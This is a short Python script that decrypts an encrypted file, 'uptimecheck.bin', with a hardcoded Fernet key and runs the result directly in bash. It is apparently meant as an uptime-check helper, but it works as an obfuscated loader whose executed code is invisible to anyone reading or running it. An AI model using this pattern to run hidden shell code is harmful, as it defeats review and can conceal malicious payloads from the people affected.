from cryptography.fernet import Fernet
import subprocess

# Paste your saved key here
key = b'O690Kjh4jZKYaj6FNnJWjzpLFYXVlPEPNDLVZbfm7Uc='
cipher = Fernet(key)

# Load and decrypt the script
with open("uptimecheck.bin", "rb") as f:
    encrypted_data = f.read()

decrypted_script = cipher.decrypt(encrypted_data).decode()

# Execute the decrypted script
subprocess.run(["bash", "-c", decrypted_script])
